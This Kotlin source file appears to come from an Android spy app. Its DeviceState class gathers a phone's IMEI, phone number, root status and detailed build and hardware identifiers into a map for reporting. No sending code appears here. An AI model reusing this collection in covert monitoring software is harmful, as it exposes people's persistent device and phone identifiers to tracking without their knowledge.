package com.komnacki.androidspyapp.device.device

import android.content.Context
import com.komnacki.androidspyapp.results.Message
import github.nisrulz.easydeviceinfo.base.EasyDeviceMod
import java.text.SimpleDateFormat


class DeviceState(override var context: Context) :
    Message {
    init {
        getDeviceState(
            context
        )
    }

    companion object {
        private const val DATE_PATERN: String = "yyyy-MM-dd"
        private val info: MutableMap<String, Any> = mutableMapOf()

        fun getDeviceState(context: Context) {
            val easyDeviceMod = EasyDeviceMod(context)
            try {
                info["IMEI"] = easyDeviceMod.imei
                info["PHONE_NUMBER"] = easyDeviceMod.phoneNo
            } catch (e: SecurityException) {
                info["IMEI"] = "Cannot get IMEI!"
                info["PHONE_NUMBER"] = "Cannot get phone number!"
            }

            info["BUILD_VERSION_CODENAME"] = easyDeviceMod.buildVersionCodename
            info["BUILD_VERSION_INCREMENTAL"] = easyDeviceMod.buildVersionIncremental
            info["BUILD_VERSION_SDK"] = easyDeviceMod.buildVersionSDK
            info["BUILD_ID"] = easyDeviceMod.buildID
            info["MANUFACTURER"] = easyDeviceMod.manufacturer
            info["MODEL"] = easyDeviceMod.model
            info["OS_CODENAME"] = easyDeviceMod.osCodename
            info["OS_VERSION"] = easyDeviceMod.osVersion
            info["RADIO_VERSION"] = easyDeviceMod.radioVer
            info["PRODUCT"] = easyDeviceMod.product
            info["DEVICE"] = easyDeviceMod.device
            info["BOARD"] = easyDeviceMod.board
            info["HARDWARE"] = easyDeviceMod.hardware
            info["BOOTLOADER"] = easyDeviceMod.bootloader
            info["FINGERPRINT"] = easyDeviceMod.fingerprint
            info["IS_ROOTED"] = easyDeviceMod.isDeviceRooted
            info["BUILD_BRAND"] = easyDeviceMod.buildBrand
            info["BUILD_HOST"] = easyDeviceMod.buildHost
            info["BUILD_TAGS"] = easyDeviceMod.buildTags
            info["BUILD_TIME"] = SimpleDateFormat(DATE_PATERN).format(easyDeviceMod.buildTime).toString()
            info["BUILD_VERSION_RELEASE"] = easyDeviceMod.buildVersionRelease
        }
    }

    override fun getData(): Map<String, Any> {
        return info
    }
}